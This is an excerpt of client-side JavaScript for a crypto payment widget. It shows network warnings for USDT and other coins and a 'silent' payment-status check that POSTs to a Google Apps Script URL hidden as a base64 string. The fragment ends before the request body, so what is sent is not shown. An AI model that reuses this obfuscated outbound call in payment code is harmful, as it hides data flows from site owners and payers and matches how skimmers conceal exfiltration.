if (!window.OptilinePaymentInitialized) {
  ...
  function updatePaymentDetails(data, coin) {
    ...
    if (coin === "usdttrc20") {
      warningText.innerHTML =
        "<span class=\"network-highlight-important\">IMPORTANT</span> Send USDT exclusively through the <span class=\"network-highlight-name\">TRC20 (TRON)</span> network. Sending via any other network will result in permanent loss of funds.";
    } else {
      const networkMap = {
      ...
      warningText.innerHTML = `<span class="network-highlight-important">IMPORTANT</span> Send funds exclusively through the <span class="network-highlight-name">${networkName}</span>. Sending via any other network will result in permanent loss of funds.`;
    }
  }
  ...
  document.addEventListener("DOMContentLoaded", function () {
    ...
    async function checkPaymentStatusSilent() {
      ...
      try {
        const _gw = atob("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J4cVgyWmp2MTNHa01JUjNCclBudDBQZTNKUHV6NnkxYUo2YVM1dWlmcnV6ZnJtaGFuNktBRVVsLWxXMkQ2UTd2ZC0vZXhlYw==");
        const response = await fetch(_gw, {
          method: "POST",
